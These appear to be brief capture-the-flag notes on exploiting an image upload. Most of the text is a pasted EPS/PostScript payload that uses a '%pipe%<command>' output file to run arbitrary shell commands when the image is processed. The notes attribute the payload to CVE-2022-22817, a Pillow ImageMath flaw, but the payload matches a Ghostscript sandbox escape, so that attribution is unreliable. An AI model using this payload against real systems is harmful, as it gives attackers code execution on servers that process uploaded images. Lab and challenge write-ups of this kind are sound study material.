Looking at the source code there is not much going on.
The only thing is the file upload.

Investigating the file upload and it seems to work fine.
Reading up on pillow finding a command injection exploit.
CVE-2022-22817

After googling around, found description of exploit here:
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%<command>) currentdevice putdeviceprops

where we can the output file and get code execution.
Wrote exploit.py to make this into a program
